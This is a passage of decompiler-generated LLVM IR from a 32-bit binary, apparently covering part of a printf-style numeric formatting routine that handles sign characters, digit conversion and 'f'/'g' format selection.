  store i32 %v2_804f8b0, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_804f8a4, %v2_804f8b0
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_804f8bb, label %dec_label_pc_804f8c8

dec_label_pc_804f8bb:                             ; preds = %dec_label_pc_804f8b0
  store i32 %v2_804f797, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f8d1

dec_label_pc_804f8c8:                             ; preds = %dec_label_pc_804f8b0
  store i32 %v2_804f8b0, i32* %edx.global-to-local, align 4
  store i32 %v2_804f8b0, i32* %ecx.global-to-local, align 4
  %v1_804f8d0 = add i32 %stack_var_-220.3, 1
  store i32 %v1_804f8d0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f8d1

dec_label_pc_804f8d1:                             ; preds = %dec_label_pc_804f8bb, %dec_label_pc_804f8c8
  %v0_804f8d1 = phi i32 [ %v0_804f8a4, %dec_label_pc_804f8bb ], [ %v2_804f8b0, %dec_label_pc_804f8c8 ]
  %v1_804f8d1 = add i32 %v0_804f8d1, 1
  store i32 %v1_804f8d1, i32* %eax.global-to-local, align 4
  %v2_804f8d8 = inttoptr i32 %v1_804f8d1 to i8*
  store i8 0, i8* %v2_804f8d8, align 1
  br i1 %v1_804f82c, label %dec_label_pc_804f8fe, label %dec_label_pc_804f8e3

dec_label_pc_804f8e3:                             ; preds = %dec_label_pc_804f8d1
  %v0_804f8e3 = load i32, i32* %esi.global-to-local, align 4
  %v5_804f8e6 = icmp slt i32 %v0_804f8e3, -4
  br i1 %v5_804f8e6, label %dec_label_pc_804f90b, label %dec_label_pc_804f8e8

dec_label_pc_804f8e8:                             ; preds = %dec_label_pc_804f8e3
  %v1_804f8e8 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804f8ea = icmp slt i32 %v1_804f8e8, %v0_804f8e3
  br i1 %v7_804f8ea, label %dec_label_pc_804f90b, label %dec_label_pc_804f8f3

dec_label_pc_804f8f3:                             ; preds = %dec_label_pc_804f8e8
  %v2_804f8f5 = sub i32 %v1_804f8e8, %v0_804f8e3
  store i32 %v2_804f8f5, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f90f

dec_label_pc_804f8fe:                             ; preds = %dec_label_pc_804f8d1
  %v4_804f8fe = zext i8 %stack_var_-207.1 to i32
  %v5_804f8fe = load i32, i32* %ebx.global-to-local, align 4
  %v6_804f8fe = and i32 %v5_804f8fe, -256
  %v7_804f8fe = or i32 %v6_804f8fe, %v4_804f8fe
  store i32 %v7_804f8fe, i32* %ebx.global-to-local, align 4
  %v10_804f902 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_804f902, label %dec_label_pc_804f8fe.dec_label_pc_804f90f_crit_edge, label %dec_label_pc_804f90b

dec_label_pc_804f8fe.dec_label_pc_804f90f_crit_edge: ; preds = %dec_label_pc_804f8fe
  %v0_804f90f.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f90f

dec_label_pc_804f90b:                             ; preds = %dec_label_pc_804f8e3, %dec_label_pc_804f8e8, %dec_label_pc_804f8fe
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804f8fe ], [ 103, %dec_label_pc_804f8e8 ], [ 103, %dec_label_pc_804f8e3 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f919

dec_label_pc_804f90f:                             ; preds = %dec_label_pc_804f8fe.dec_label_pc_804f90f_crit_edge, %dec_label_pc_804f8f3
  %v0_804f911 = phi i32 [ %v0_804f90f.pre, %dec_label_pc_804f8fe.dec_label_pc_804f90f_crit_edge ], [ %v0_804f8e3, %dec_label_pc_804f8f3 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804f8fe.dec_label_pc_804f90f_crit_edge ], [ 102, %dec_label_pc_804f8f3 ]
  %v2_804f90f = icmp slt i32 %v0_804f911, 0
  store i32 %v0_804f911, i32* %ebx.global-to-local, align 4
  %v1_804f913 = icmp eq i1 %v2_804f90f, false
  br i1 %v1_804f913, label %dec_label_pc_804f919, label %dec_label_pc_804f915

dec_label_pc_804f915:                             ; preds = %dec_label_pc_804f90f
  %v0_804f915 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f915 = add i32 %v0_804f915, -1
  store i32 %v1_804f915, i32* %edx.global-to-local, align 4
  %v1_804f916 = inttoptr i32 %v1_804f915 to i8*
  store i8 48, i8* %v1_804f916, align 1
  %v0_804f94e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f919

dec_label_pc_804f919:                             ; preds = %dec_label_pc_804f90f, %dec_label_pc_804f90b, %dec_label_pc_804f915
  %v1_804f9a9 = phi i32 [ %v0_804f911, %dec_label_pc_804f90f ], [ %v0_804f94e.pre, %dec_label_pc_804f915 ], [ 0, %dec_label_pc_804f90b ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_804f90f ], [ %stack_var_-197.1, %dec_label_pc_804f915 ], [ %stack_var_-197.0, %dec_label_pc_804f90b ]
  %v2_804f919 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_804f919, i32* %eax.global-to-local, align 4
  %v0_804f928 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f928 = add i32 %v0_804f928, 1
  store i32 %v1_804f928, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_804f937 = inttoptr i32 %v0_804f928 to i8*
  %v2_804f937 = load i8, i8* %v1_804f937, align 1
  %v3_804f937 = zext i8 %v2_804f937 to i32
  %v5_804f937 = and i32 %v2_804f919, -256
  %v6_804f937 = or i32 %v3_804f937, %v5_804f937
  store i32 %v6_804f937, i32* %eax.global-to-local, align 4
  store i32 %v6_804f937, i32* %stack_var_-22, align 4
  %v2_804f94c = sub i32 %v1_804f8d1, %v1_804f928
  store i32 %v2_804f94c, i32* %edx.global-to-local, align 4
  %v1_804f94e = icmp eq i32 %v1_804f9a9, 0
  %v2_804f94e = icmp slt i32 %v1_804f9a9, 0
  br i1 %v2_804f94e, label %dec_label_pc_804f99d, label %dec_label_pc_804f952

dec_label_pc_804f952:                             ; preds = %dec_label_pc_804f919
  %v2_804f952 = sub i32 %v1_804f9a9, %v2_804f94c
  %v8_804f952 = xor i32 %v2_804f94c, %v1_804f9a9
  %v9_804f952 = xor i32 %v2_804f952, %v1_804f9a9
  %v10_804f952 = and i32 %v9_804f952, %v8_804f952
  %v11_804f952 = icmp slt i32 %v10_804f952, 0
  %v13_804f952 = icmp slt i32 %v2_804f952, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_804f960 = icmp eq i1 %v13_804f952, %v11_804f952
  br i1 %v2_804f960, label %dec_label_pc_804f962, label %dec_label_pc_804f996

dec_label_pc_804f962:                             ; preds = %dec_label_pc_804f952
  store i32 %v2_804f952, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_804f952, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_804f977, label %dec_label_pc_804f992

dec_label_pc_804f977:                             ; preds = %dec_label_pc_804f962
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_804f992

dec_label_pc_804f992:                             ; preds = %dec_label_pc_804f962, %dec_label_pc_804f977
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_804f977 ], [ %stack_var_-132, %dec_label_pc_804f962 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f9b2

dec_label_pc_804f996:                             ; preds = %dec_label_pc_804f952
  %v4_804f998 = icmp eq i1 %v1_804f94e, false
  br i1 %v4_804f998, label %dec_label_pc_804f9a3, label %dec_label_pc_804f99a

dec_label_pc_804f99a:                             ; preds = %dec_label_pc_804f996
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f99d

dec_label_pc_804f99d:                             ; preds = %dec_label_pc_804f919, %dec_label_pc_804f99a
  %v0_804f9e5112 = phi i32 [ %v1_804f9a9, %dec_label_pc_804f919 ], [ -1, %dec_label_pc_804f99a ]
  %v2_804f99d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f99d, i32* @ecx, align 4
  br label %dec_label_pc_804f9b2

dec_label_pc_804f9a3:                             ; preds = %dec_label_pc_804f996
  %v2_804f9a7 = add i32 %v1_804f928, %v1_804f9a9
  store i32 %v2_804f9a7, i32* %edi.global-to-local, align 4
  %v2_804f9a9 = sub i32 %v2_804f94c, %v1_804f9a9
  store i32 %v2_804f9a9, i32* %edx.global-to-local, align 4
  %v2_804f9ab = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804f9ab, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9b2

dec_label_pc_804f9b2:                             ; preds = %dec_label_pc_804f99d, %dec_label_pc_804f992, %dec_label_pc_804f9a3
  %v0_804f9e5111 = phi i32 [ %v0_804f9e5112, %dec_label_pc_804f99d ], [ -1, %dec_label_pc_804f992 ], [ -1, %dec_label_pc_804f9a3 ]
  %v0_804f9ce = phi i32 [ %v2_804f99d, %dec_label_pc_804f99d ], [ %storemerge28, %dec_label_pc_804f992 ], [ %v2_804f9ab, %dec_label_pc_804f9a3 ]
  %v0_804f9bf = phi i32 [ %v2_804f94c, %dec_label_pc_804f99d ], [ 0, %dec_label_pc_804f992 ], [ %v2_804f9a9, %dec_label_pc_804f9a3 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_804f9b9 = inttoptr i32 %v1_804f62f to i8*
  %v3_804f9b9 = load i8, i8* %v2_804f9b9, align 1
  %v4_804f9b9 = and i8 %v3_804f9b9, 16
  %v5_804f9b9 = icmp eq i8 %v4_804f9b9, 0
  %v1_804f9bd = icmp eq i1 %v5_804f9b9, false
  br i1 %v1_804f9bd, label %dec_label_pc_804f9ce, label %dec_label_pc_804f9bf

dec_label_pc_804f9bf:                             ; preds = %dec_label_pc_804f9b2
  %v1_804f9bf = icmp eq i32 %v0_804f9bf, 0
  %v1_804f9c1 = icmp eq i1 %v1_804f9bf, false
  br i1 %v1_804f9c1, label %dec_label_pc_804f9ce, label %dec_label_pc_804f9c3

dec_label_pc_804f9c3:                             ; preds = %dec_label_pc_804f9bf
  br i1 %v12_804f827, label %dec_label_pc_804f9e5, label %dec_label_pc_804f9ca

dec_label_pc_804f9ca:                             ; preds = %dec_label_pc_804f9c3
  %v0_804f9ca = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_804f9ca, 1
  br i1 %tmp189, label %dec_label_pc_804f9e5, label %dec_label_pc_804f9ce

dec_label_pc_804f9ce:                             ; preds = %dec_label_pc_804f9ca, %dec_label_pc_804f9bf, %dec_label_pc_804f9b2
  %v1_804f9ce = inttoptr i32 %v0_804f9ce to i32*
  store i32 112, i32* %v1_804f9ce, align 4
  %v0_804f9d4 = load i32, i32* @ecx, align 4
  %v1_804f9d4 = add i32 %v0_804f9d4, 4
  %v2_804f9d4 = inttoptr i32 %v1_804f9d4 to i32*
  store i32 1, i32* %v2_804f9d4, align 4
  %v0_804f9db = load i32, i32* @ecx, align 4
  %v1_804f9db = add i32 %v0_804f9db, 8
  %v2_804f9db = inttoptr i32 %v1_804f9db to i32*
  store i32 ptrtoint (i32* @global_var_80517dc.133 to i32), i32* %v2_804f9db, align 4
  %v0_804f9e2 = load i32, i32* @ecx, align 4
  %v1_804f9e2 = add i32 %v0_804f9e2, 12
  store i32 %v1_804f9e2, i32* @ecx, align 4
  %v0_804f9e5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9e5

dec_label_pc_804f9e5:                             ; preds = %dec_label_pc_804f9ca, %dec_label_pc_804f9c3, %dec_label_pc_804f9ce
  %v0_804f9ec = phi i32 [ %v0_804f9ce, %dec_label_pc_804f9ca ], [ %v0_804f9ce, %dec_label_pc_804f9c3 ], [ %v1_804f9e2, %dec_label_pc_804f9ce ]
  %v0_804f9e5 = phi i32 [ %v0_804f9e5111, %dec_label_pc_804f9ca ], [ %v0_804f9e5111, %dec_label_pc_804f9c3 ], [ %v0_804f9e5.pre, %dec_label_pc_804f9ce ]
  %v1_804f9e5 = add i32 %v0_804f9e5, 1
  %v8_804f9e5 = icmp eq i32 %v1_804f9e5, 0
  store i32 %v1_804f9e5, i32* %ebx.global-to-local, align 4
  br i1 %v8_804f9e5, label %dec_label_pc_804f9ff, label %dec_label_pc_804f9e8

dec_label_pc_804f9e8:                             ; preds = %dec_label_pc_804f9e5
  %v1_804f9ea = sub i32 -1, %v0_804f9e5
  store i32 %v1_804f9ea, i32* %eax.global-to-local, align 4
  %v1_804f9ec = inttoptr i32 %v0_804f9ec to i32*
  store i32 176, i32* %v1_804f9ec, align 4
  %v0_804f9f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f9f2 = load i32, i32* @ecx, align 4
  %v2_804f9f2 = add i32 %v1_804f9f2, 4
  %v3_804f9f2 = inttoptr i32 %v2_804f9f2 to i32*
  store i32 %v0_804f9f2, i32* %v3_804f9f2, align 4
  %v0_804f9f5 = load i32, i32* @ecx, align 4
  %v1_804f9f5 = add i32 %v0_804f9f5, 8
  %v2_804f9f5 = inttoptr i32 %v1_804f9f5 to i32*
  store i32 ptrtoint (i32* @global_var_80517cf.132 to i32), i32* %v2_804f9f5, align 4
  %v0_804f9fc = load i32, i32* @ecx, align 4
  %v1_804f9fc = add i32 %v0_804f9fc, 12
  store i32 %v1_804f9fc, i32* @ecx, align 4
  br label %dec_label_pc_804f9ff

dec_label_pc_804f9ff:                             ; preds = %dec_label_pc_804f9e5, %dec_label_pc_804f9e8
  %v0_804fa03 = phi i32 [ %v0_804f9ec, %dec_label_pc_804f9e5 ], [ %v1_804f9fc, %dec_label_pc_804f9e8 ]
  %v0_804f9ff = load i32, i32* %edx.global-to-local, align 4
  %v1_804f9ff = icmp eq i32 %v0_804f9ff, 0
  br i1 %v1_804f9ff, label %dec_label_pc_804fa12, label %dec_label_pc_804fa03

dec_label_pc_804fa03:                             ; preds = %dec_label_pc_804f9ff
  %v1_804fa03 = inttoptr i32 %v0_804fa03 to i32*
  store i32 112, i32* %v1_804fa03, align 4
  %v0_804fa09 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fa09 = load i32, i32* @ecx, align 4
  %v2_804fa09 = add i32 %v1_804fa09, 4
  %v3_804fa09 = inttoptr i32 %v2_804fa09 to i32*
  store i32 %v0_804fa09, i32* %v3_804fa09, align 4
  %v0_804fa0c = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa0c = load i32, i32* @ecx, align 4
  %v2_804fa0c = add i32 %v1_804fa0c, 8
  %v3_804fa0c = inttoptr i32 %v2_804fa0c to i32*
  store i32 %v0_804fa0c, i32* %v3_804fa0c, align 4
  %v0_804fa0f = load i32, i32* @ecx, align 4
  %v1_804fa0f = add i32 %v0_804fa0f, 12
  store i32 %v1_804fa0f, i32* @ecx, align 4
  br label %dec_label_pc_804fa12

dec_label_pc_804fa12:                             ; preds = %dec_label_pc_804f9ff, %dec_label_pc_804fa03
  %v0_804fa30 = phi i32 [ %v0_804fa03, %dec_label_pc_804f9ff ], [ %v1_804fa0f, %dec_label_pc_804fa03 ]
  br i1 %v1_804f82c, label %dec_label_pc_804fa26, label %dec_label_pc_804fa19

dec_label_pc_804fa19:                             ; preds = %dec_label_pc_804fa12
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_804fa20 = load i8, i8* %v2_804f9b9, align 1
  %v4_804fa20 = and i8 %v3_804fa20, 16
  %v5_804fa20 = icmp eq i8 %v4_804fa20, 0
  br i1 %v5_804fa20, label %dec_label_pc_804fa43, label %dec_label_pc_804fa26

dec_label_pc_804fa26:                             ; preds = %dec_label_pc_804fa19, %dec_label_pc_804fa12
  %v0_804fa26 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fa28 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fa28 = sub i32 %v0_804fa26, %v1_804fa28
  store i32 %v2_804fa28, i32* %eax.global-to-local, align 4
  %v1_804fa2a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804fa2a = sub i32 %v2_804fa28, %v1_804fa2a
  %v8_804fa2a = xor i32 %v1_804fa2a, %v2_804fa28
  %v9_804fa2a = xor i32 %v2_804fa2a, %v2_804fa28
  %v10_804fa2a = and i32 %v9_804fa2a, %v8_804fa2a
  %v11_804fa2a = icmp slt i32 %v10_804fa2a, 0
  %v13_804fa2a = icmp slt i32 %v2_804fa2a, 0
  %v2_804fa2c = icmp eq i1 %v13_804fa2a, %v11_804fa2a
  br i1 %v2_804fa2c, label %dec_label_pc_804fa43, label %dec_label_pc_804fa2e

dec_label_pc_804fa2e:                             ; preds = %dec_label_pc_804fa26
  %v2_804fa2e = sub i32 %v1_804fa2a, %v2_804fa28
  store i32 %v2_804fa2e, i32* %ebp.global-to-local, align 4
  %v1_804fa30 = inttoptr i32 %v0_804fa30 to i32*
  store i32 176, i32* %v1_804fa30, align 4
  %v0_804fa36 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fa36 = load i32, i32* @ecx, align 4
  %v2_804fa36 = add i32 %v1_804fa36, 4
  %v3_804fa36 = inttoptr i32 %v2_804fa36 to i32*
  store i32 %v0_804fa36, i32* %v3_804fa36, align 4
  %v0_804fa39 = load i32, i32* @ecx, align 4
  %v1_804fa39 = add i32 %v0_804fa39, 8
  %v2_804fa39 = inttoptr i32 %v1_804fa39 to i32*
  store i32 ptrtoint (i32* @global_var_80517cf.132 to i32), i32* %v2_804fa39, align 4
  %v0_804fa40 = load i32, i32* @ecx, align 4
  %v1_804fa40 = add i32 %v0_804fa40, 12
  store i32 %v1_804fa40, i32* @ecx, align 4
  br label %dec_label_pc_804fa43

dec_label_pc_804fa43:                             ; preds = %dec_label_pc_804fa26, %dec_label_pc_804fa19, %dec_label_pc_804fa2e
  %v1_804facb121 = phi i32 [ %v0_804fa30, %dec_label_pc_804fa26 ], [ %v0_804fa30, %dec_label_pc_804fa19 ], [ %v1_804fa40, %dec_label_pc_804fa2e ]
  %v12_804fa43 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_804fa43, label %dec_label_pc_804fabe, label %dec_label_pc_804fa4a

dec_label_pc_804fa4a:                             ; preds = %dec_label_pc_804fa43
  %v5_804fa4a = load i32, i32* %edx.global-to-local, align 4
  %v6_804fa4a = and i32 %v5_804fa4a, -256
  %v7_804fa4a = or i32 %v6_804fa4a, %stack_var_-42.0
  store i32 %v7_804fa4a, i32* %edx.global-to-local, align 4
  %v0_804fa51 = load i32, i32* %esi.global-to-local, align 4
  %v2_804fa51 = icmp slt i32 %v0_804fa51, 0
  %v1_804fa53 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_804fa51, label %dec_label_pc_804fa62, label %dec_label_pc_804fa6b

dec_label_pc_804fa62:                             ; preds = %dec_label_pc_804fa4a
  store i32 %v0_804fa51, i32* %edx.global-to-local, align 4
  %v1_804fa64 = sub i32 0, %v0_804fa51
  br label %dec_label_pc_804fa6b

dec_label_pc_804fa6b:                             ; preds = %dec_label_pc_804fa4a, %dec_label_pc_804fa62
  %storemerge27 = phi i32 [ %v1_804fa64, %dec_label_pc_804fa62 ], [ %v0_804fa51, %dec_label_pc_804fa4a ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_804fa62 ], [ 43, %dec_label_pc_804fa4a ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_804fa73 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_804fa73, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa7f

dec_label_pc_804fa7f:                             ; preds = %dec_label_pc_804fa7f.backedge, %dec_label_pc_804fa6b
  %v0_804fa8a = phi i32 [ %v0_804fa8a.pre, %dec_label_pc_804fa7f.backedge ], [ %v2_804fa73, %dec_label_pc_804fa6b ]
  %v0_804fa87 = phi i32 [ %v0_804fa87.pre, %dec_label_pc_804fa7f.backedge ], [ 2, %dec_label_pc_804fa6b ]
  %v0_804fa7f = phi i32 [ %v9_804fa88, %dec_label_pc_804fa7f.backedge ], [ %storemerge27, %dec_label_pc_804fa6b ]
  %v1_804fa86 = ashr i32 %v0_804fa7f, 31
  %v1_804fa87 = add i32 %v0_804fa87, 1
  store i32 %v1_804fa87, i32* %edi.global-to-local, align 4
  %v2_804fa88 = zext i32 %v0_804fa7f to i64
  %v4_804fa88 = zext i32 %v1_804fa86 to i64
  %v5_804fa88 = mul nuw i64 %v4_804fa88, 4294967296
  %v6_804fa88 = or i64 %v5_804fa88, %v2_804fa88
  %v8_804fa88 = sdiv i64 %v6_804fa88, 10
  %v9_804fa88 = trunc i64 %v8_804fa88 to i32
  %v10_804fa88 = srem i64 %v6_804fa88, 10
  %v1_804fa8a = add i32 %v0_804fa8a, -1
  store i32 %v1_804fa8a, i32* %ebx.global-to-local, align 4
  store i32 %v9_804fa88, i32* %esi.global-to-local, align 4
  %v3_804fa8d = and i32 %v9_804fa88, -256
  %v1_804fa8f = trunc i64 %v10_804fa88 to i8
  %v2_804fa8f = add i8 %v1_804fa8f, 48
  %v12_804fa8f = zext i8 %v2_804fa8f to i32
  %v15_804fa8f = or i32 %v12_804fa8f, %v3_804fa8d
  store i32 %v15_804fa8f, i32* %eax.global-to-local, align 4
  %v3_804fa94 = inttoptr i32 %v1_804fa8a to i8*
  store i8 %v2_804fa8f, i8* %v3_804fa94, align 1
  store i32 %v9_804fa88, i32* %edx.global-to-local, align 4
  %v7_804fa98 = icmp sgt i32 %v1_804fa87, 3
  br i1 %v7_804fa98, label %dec_label_pc_804fa9a, label %dec_label_pc_804fa7f.backedge

dec_label_pc_804fa9a:                             ; preds = %dec_label_pc_804fa7f
  %v2_804fa9a = icmp eq i32 %v9_804fa88, 0
  %v1_804fa9c = icmp eq i1 %v2_804fa9a, false
  br i1 %v1_804fa9c, label %dec_label_pc_804fa7f.backedge, label %dec_label_pc_804fa9e

dec_label_pc_804fa7f.backedge:                    ; preds = %dec_label_pc_804fa9a, %dec_label_pc_804fa7f
  %v0_804fa87.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_804fa8a.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa7f

dec_label_pc_804fa9e:                             ; preds = %dec_label_pc_804fa9a
  %v4_804fa9e = zext i8 %storemerge9 to i32
  %v7_804fa9e = or i32 %v3_804fa8d, %v4_804fa9e
  store i32 %v7_804fa9e, i32* %edx.global-to-local, align 4
  %v0_804faa2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804faa2 = add i32 %v0_804faa2, -2
  store i32 %v1_804faa2, i32* %eax.global-to-local, align 4
  %v3_804faa5 = add i32 %v0_804faa2, -1
  %v4_804faa5 = inttoptr i32 %v3_804faa5 to i8*
  store i8 %storemerge9, i8* %v4_804faa5, align 1
  %v5_804faa8 = load i32, i32* %edx.global-to-local, align 4
  %v6_804faa8 = and i32 %v5_804faa8, -256
  %v7_804faa8 = or i32 %v6_804faa8, %stack_var_-42.0
  store i32 %v7_804faa8, i32* %edx.global-to-local, align 4
  %v2_804faac = load i32, i32* %ebx.global-to-local, align 4
  %v3_804faac = add i32 %v2_804faac, -2
  %v4_804faac = inttoptr i32 %v3_804faac to i8*
  store i8 %v1_804fa53, i8* %v4_804faac, align 1
  %v0_804faaf = load i32, i32* @ecx, align 4
  %v1_804faaf = inttoptr i32 %v0_804faaf to i32*
  store i32 112, i32* %v1_804faaf, align 4
  %v0_804fab5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fab5 = load i32, i32* @ecx, align 4
  %v2_804fab5 = add i32 %v1_804fab5, 4
  %v3_804fab5 = inttoptr i32 %v2_804fab5 to i32*
  store i32 %v0_804fab5, i32* %v3_804fab5, align 4
  %v0_804fab8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fab8 = load i32, i32* @ecx, align 4
  %v2_804fab8 = add i32 %v1_804fab8, 8
  %v3_804fab8 = inttoptr i32 %v2_804fab8 to i32*
  store i32 %v0_804fab8, i32* %v3_804fab8, align 4
  %v0_804fabb = load i32, i32* @ecx, align 4
  %v1_804fabb = add i32 %v0_804fabb, 12
  store i32 %v1_804fabb, i32* @ecx, align 4
  br label %dec_label_pc_804fabe

dec_label_pc_804fabe:                             ; preds = %dec_label_pc_804fa43, %dec_label_pc_804f6ed, %dec_label_pc_804fa9e
  %v0_804fb3d = phi i32 [ %v1_804facb121, %dec_label_pc_804fa43 ], [ %v2_804f6f5, %dec_label_pc_804f6ed ], [ %v1_804fabb, %dec_label_pc_804fa9e ]
  %v2_804fabe = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804fabe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fac2

dec_label_pc_804fac2:                             ; preds = %dec_label_pc_804fac2, %dec_label_pc_804fabe
  %v0_804fac2 = phi i32 [ %v2_804fabe, %dec_label_pc_804fabe ], [ %v1_804fac4, %dec_label_pc_804fac2 ]
  %stack_var_-216.0 = phi i32 [ %v3_804f5ef, %dec_label_pc_804fabe ], [ %v5_804fac7, %dec_label_pc_804fac2 ]
  %v1_804fac2 = inttoptr i32 %v0_804fac2 to i32*
  %v2_804fac2 = load i32, i32* %v1_804fac2, align 4
  store i32 %v2_804fac2, i32* %ebx.global-to-local, align 4
  %v1_804fac4 = add i32 %v0_804fac2, 12
  store i32 %v1_804fac4, i32* %eax.global-to-local, align 4
  %v5_804fac7 = sub i32 %stack_var_-216.0, %v2_804fac2
  %v7_804facb = icmp ult i32 %v1_804fac4, %v0_804fb3d
  br i1 %v7_804facb, label %dec_label_pc_804fac2, label %dec_label_pc_804facf

dec_label_pc_804facf:                             ; preds = %dec_label_pc_804fac2
  store i32 %v0_804fb3d, i32* %esi.global-to-local, align 4
  %v5_804fae2 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_804faf2 = icmp eq i1 %v5_804fae2, false
  %v2_804faf2 = zext i1 %v1_804faf2 to i32
  store i32 %v2_804faf2, i32* %edx.global-to-local, align 4
  %v2_804faf5 = sub i32 %v5_804fac7, %v2_804faf2
  store i32 %v2_804faf5, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_804faf5, 1
  br i1 %tmp190, label %dec_label_pc_804fb3f, label %dec_label_pc_804faff

dec_label_pc_804faff:                             ; preds = %dec_label_pc_804facf
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_804fb06 = inttoptr i32 %v1_804f62f to i8*
  %v3_804fb06 = load i8, i8* %v2_804fb06, align 1
  %v4_804fb06 = and i8 %v3_804fb06, 8
  %v5_804fb06 = icmp eq i8 %v4_804fb06, 0
  br i1 %v5_804fb06, label %dec_label_pc_804fb21, label %dec_label_pc_804fb0c

dec_label_pc_804fb0c:                             ; preds = %dec_label_pc_804faff
  %v1_804fb0c = add i32 %v0_804fb3d, 12
  store i32 %v1_804fb0c, i32* %esi.global-to-local, align 4
  %v1_804fb0f = inttoptr i32 %v0_804fb3d to i32*
  store i32 160, i32* %v1_804fb0f, align 4
  %v1_804fb15 = load i32, i32* @ecx, align 4
  %v2_804fb15 = add i32 %v1_804fb15, 4
  %v3_804fb15 = inttoptr i32 %v2_804fb15 to i32*
  store i32 %v2_804faf5, i32* %v3_804fb15, align 4
  %v0_804fb18 = load i32, i32* @ecx, align 4
  %v1_804fb18 = add i32 %v0_804fb18, 8
  %v2_804fb18 = inttoptr i32 %v1_804fb18 to i32*
  store i32 ptrtoint (i32* @global_var_80517cf.132 to i32), i32* %v2_804fb18, align 4
  br label %dec_label_pc_804fb3f

dec_label_pc_804fb21:                             ; preds = %dec_label_pc_804faff
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_804fb28 = add i32 %tmp156, 16
  %v2_804fb28 = inttoptr i32 %v1_804fb28 to i32*
  %v3_804fb28 = load i32, i32* %v2_804fb28, align 4
  %v9_804fb28 = icmp eq i32 %v3_804fb28, 48
  %v1_804fb2c = icmp eq i1 %v9_804fb28, false
  br i1 %v1_804fb2c, label %dec_label_pc_804fb39, label %dec_label_pc_804fb2e

dec_label_pc_804fb2e:                             ; preds = %dec_label_pc_804fb21
  %v3_804fb2e = load i32, i32* %stack_var_-152, align 4
  %v5_804fb2e = add i32 %v3_804fb2e, %v2_804faf5
  store i32 %v5_804fb2e, i32* %stack_var_-152, align 4
  br label %dec_label_pc_804fb3d

dec_label_pc_804fb34:                             ; preds = %dec_label_pc_804fb45
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb6c

dec_label_pc_804fb39:                             ; preds = %dec_label_pc_804fb21
  br label %dec_label_pc_804fb3d

dec_label_pc_804fb3d:                             ; preds = %dec_label_pc_804fb2e, %dec_label_pc_804fb39
  store i32 %v0_804fb3d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fb3f

dec_label_pc_804fb3f:                             ; preds = %dec_label_pc_804facf, %dec_label_pc_804fb0c, %dec_label_pc_804fb3d
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804fb41 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804fb41, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb45

dec_label_pc_804fb45:                             ; preds = %dec_label_pc_804fb63, %dec_label_pc_804fb3f
  call void @__pseudo_call(i32 %tmp156)
